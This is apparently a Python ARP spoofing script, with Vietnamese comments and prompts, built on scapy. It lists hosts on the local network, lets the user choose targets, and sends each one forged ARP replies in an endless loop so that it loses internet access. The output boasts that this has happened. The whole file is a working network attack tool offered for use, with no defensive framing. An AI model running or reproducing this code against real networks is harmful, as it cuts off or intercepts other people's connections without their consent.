from scapy.all import *
import time 
import os 
from utils import get_info, get_ip, get_mac , get_gateway
import threading

"""
cần tăng hiệu quả của chương trình.
#giao diện người dùng tốt hơn
cần dọn dẹp mã.
cần thêm điều kiện thoát để chương trình đóng thành công.
cần thêm hỗ trợ linux
[++] đã thêm hỗ trợ để lấy địa chỉ ip bên ngoài lược đồ đặt tên ipv4 192.168.
Bản dựng - 1.1.1
"""

def main():
    try:
        #start of the program
        print("[+] ARP Spoofer sắp bắt đầu ..., nhấn ctrl+c để dừng.")
        time.sleep(3)
        g_ip = str(get_gateway())
        os.system("cls")
        #get mac and gateway from user
        mm = str(input("[?] Nhập địa chỉ mac của bạn (sử dụng ipconfig /all trong terminal nếu bạn không biết!) - "))
        mm = mm.replace("-",":")
        gip  = str(input(f"[?] Nhập ip cổng (Đã quét - {g_ip}) - "))
        os.system("cls")

        #gets information about devices in network
        h = get_info()
        print("Từ bảng dữ liệu...")
        print("\n")
        
        #take target ids from user
        ids = str(input("[?] Nhập id của (nhiều) mục tiêu của bạn với dấu '&' ở giữa hai id - "))
        ids = ids.split("&")

        def send_arp_pkt(my_mac , target_mac , gateway_ip , target_ip):
                flag = 0 # time sequence checker var
                #Creating of packets
                p1  =  Ether()
                p1.src  = my_mac
                p1.dst = target_mac


                p2 = ARP()
                p2.psrc =  gateway_ip
                p2.hwsrc =  my_mac
                p2.pdst =  target_ip
                p2.hwdst =  target_mac
                p2.op = 2 # operation code is 2
                t1 = time.time()
                
                pkt = p1/p2

                #sending unlimited ARP spoofer packet.
                while 1:
                    t2 = time.time()
                    sendp(pkt , verbose = False)
                    if(int(t2-t1)>=10 and flag == 0):
                        os.system("cls")
                        print(f"[!] Mục tiêu {p2.pdst} của bạn sẽ không thể truy cập internet nữa :) (Tiếp tục chương trình để ngăn chặn truy cập)\n")
                        flag = 1
                 

        def run(x):#Runner function which takes in target id
            try:
                global id , tm , tip
                id = int(x)
                tm = str(get_mac(h[id]))
                tip  = str(get_ip(h[id]))
                send_arp_pkt(mm, tm ,gip,tip)
            except  KeyboardInterrupt:
                exit(0)
            except Exception as e :
                print(e)


        threads = []#list of threads for the  runner function.
        

        #creating threads for each instance of runner function
        for k in ids:
            t = threading.Thread(target=run , args=(k,))
            t.daemon = False
            threads.append(t)
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        

    except KeyboardInterrupt:
        exit(0)
      
    except Exception as e:
        print(e) 
        time.sleep(4)
        exit(0)


if (__name__=="__main__"):
    main()